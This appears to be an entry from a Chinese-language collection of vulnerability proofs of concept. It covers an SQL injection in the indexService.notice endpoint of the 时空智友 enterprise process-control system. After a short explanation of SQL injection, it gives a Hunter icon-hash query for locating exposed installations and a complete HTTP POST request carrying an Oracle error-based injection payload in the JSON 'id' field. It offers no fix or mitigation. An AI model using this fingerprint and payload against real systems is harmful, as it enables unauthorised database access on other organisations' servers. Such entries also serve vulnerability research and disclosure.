# 时空智友企业流程化管控系统indexService.notice存在sql注入漏洞

# 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统存在SQL注入漏洞，攻击者通过恶意构造的SQL查询来执行未经授权的数据库操作。当应用程序未能正确验证、转义或过滤用户提供的输入数据时，攻击者可以利用这个漏洞来执行恶意的SQL语句，从而绕过应用程序的访问控制和执行非法操作。

# 二、影响版本
+ 时空智友企业流程化管控系统

# 三、资产测绘
+ hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`

# 四、漏洞复现
```plain
POST /formservice?service=indexService.notice HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json

{"id":"1' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))-- fKEk"}
```
